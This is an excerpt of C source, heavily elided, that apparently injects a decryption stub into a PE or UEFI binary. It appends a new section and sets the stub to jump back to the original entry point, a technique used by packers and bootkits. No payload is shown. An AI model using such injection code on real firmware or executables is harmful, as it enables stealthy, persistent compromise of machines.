...
UCHAR decodeStub[] = {
	...
	0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,                         // 7 push registers (except rax)
	...
	0x48, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,       // 10 mov rax, <Oep>
	0x5B,                                                             // 1 pop rbx
	0x48, 0x01, 0xD8,                                                 // 3 add rax, rbx        <= Oep to absolute addr
	0x48, 0x83, 0xc4, 0x48,                                           // 4 add rsp, 0x48
	0x5F, 0x5E, 0x5D, 0x5C, 0x5B, 0x5A, 0x59,                         // 7 pop registers (except rax)
	0xFF, 0xE0                                                        // 2 jmp rax (oep)
};
...
void CreateDecodeStub(QWORD SectionVaddr, QWORD SectionVsize, QWORD oep, QWORD extRaddr, DWORD decodeStubOffset) {
	extEfiMainOffset = 15;
	UINT offset1Offset = extEfiMainOffset + 2 + 7 + 4 + 3 + 4 + 5 + 1 + 3 + 4;
	...
	UINT OepOffset = DecryptSizeOffset + 7 + 1 + 2 + 3;

	DWORD offset1 = extEfiMainOffset + 2 + 7 + 4 + 3 + 4 + 5 + 1;
	...
	memcpy(&decodeStub[OepOffset], &oep, sizeof(QWORD));
	return;
}
...
void AddExtSection(PE* pe, UCHAR* lpTargetBinBuffer, DWORD dwTargetBinSize, UINT extSize, UINT extHeaderSize, UINT* sizeIncrease) {
	...
	*sizeIncrease = 0;
	...
	DbgPrint("size increase: 0x%X", *sizeIncrease);
...
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	...
	UCHAR* lpTargetBinBuffer;
	UINT extSize = 2200;
	UINT extHeaderSize = 0x28; // sizeof(IMAGE_SECTION_HEADER)
	UINT sizeIncrease = 0;
